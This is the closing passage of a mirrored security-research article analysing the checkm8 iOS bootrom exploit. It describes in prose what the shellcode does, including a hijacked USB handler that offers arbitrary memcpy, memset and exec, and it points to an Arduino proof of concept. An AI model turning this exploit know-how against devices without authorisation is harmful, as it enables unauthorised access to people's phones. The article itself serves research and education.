style=";text-align:right;direction:rtl"> Control is transferred to the initializing <code>shellcode</code> . </p><br><p style=";text-align:right;direction:rtl"> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode" style=";text-align:right;direction:rtl"> 6. Execution of <code>shellcode</code> </h2><br><p style=";text-align:right;direction:rtl"> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors" style=";text-align:right;direction:rtl"> 6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p style=";text-align:right;direction:rtl"> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber" style=";text-align:right;direction:rtl"> 6.2. Changing <code>USBSerialNumber</code> </h4><br><p style=";text-align:right;direction:rtl"> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler" style=";text-align:right;direction:rtl"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p style=";text-align:right;direction:rtl"> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00" style=";text-align:right;direction:rtl"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p style=";text-align:right;direction:rtl"> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p style=";text-align:right;direction:rtl"> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb" style=";text-align:right;direction:rtl"> The implementation of the exploit at a lower level of working with USB </h2><br><p style=";text-align:right;direction:rtl"> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;;text-align:right;direction:rtl"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion" style=";text-align:right;direction:rtl"> In place of a conclusion </h2><br><p style=";text-align:right;direction:rtl"> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed โ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p style=";text-align:right;direction:rtl"> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references" style=";text-align:right;direction:rtl"> References </h2><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Apple, iOS Security Guide</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">littlelailo, apollo.txt</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">usb.org</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">USB in a NutShell</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ipwndfu</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar472762/">https://habr.com/ru/post/ar472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar472750/index.html">ุญุณููุง ุ ูู ุฃุญุชุงุฌ ุญููุง ุฅูู Kubernetesุ</a></li>
<li><a href="../ar472752/index.html">CSE: Kubernetes ูุฃู ุดุฎุต ูู vCloud</a></li>
<li><a href="../ar472754/index.html">ููู ุชุชุญุฏุซ ุงูุงูุฌููุฒูุฉ ูู ุดูุฑ. 9 ุฎุทูุงุช ุณููุฉ ูุซุจุช</a></li>
<li><a href="../ar472758/index.html">ุงูุชุฑุงุญ: ูุญุงููุฉ - ุงููุฏูุฌ ูู ูุธููุฉ ุงูุชุญูู ูู ุงูุฎุทุฃ</a></li>
<li><a href="../ar472760/index.html">ุชูููู ููุช ุงูุญูุณุจุฉ ูู ุจุถุน ุณููุงุช ุฅูู ุฏูุงุฆู. ููู ุชุนูู ุขูุฉ ุงููู</a></li>
<li><a href="../ar472766/index.html">ุงููุนููุฉ ูู ุงูููู ูู py.test</a></li>
<li><a href="../ar472768/index.html">ููููุฉ ุงูุชูุธูู ูุฅุทูุงู ุงููุงุฑ ูุงูุนูุฏุฉ ูู ุงูุฅุฏุงุฑุฉ ุฅูู ุงูุชุทููุฑ: ููุฏูู ูู Badoo Techleads Meetup # 5</a></li>
<li><a href="../ar472770/index.html">ุชูุธูู ูุงุฌูุฉ ูู ุงููุญุฏุฉ ูุน UI Canvas</a></li>
<li><a href="../ar472772/index.html">ุงูุจุญุซ ุนู ุญูุงุฏุซ ููุทุงูุจุงุช ููุงุซูุฉ. ุงูููุงููุณ ูุงูุชุญุณูู</a></li>
<li><a href="../ar472776/index.html">ุงููุณุฎ ุงูุงุญุชูุงุทู ุงูุฌุฒุก 7: ุงูุงุณุชูุชุงุฌุงุช</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>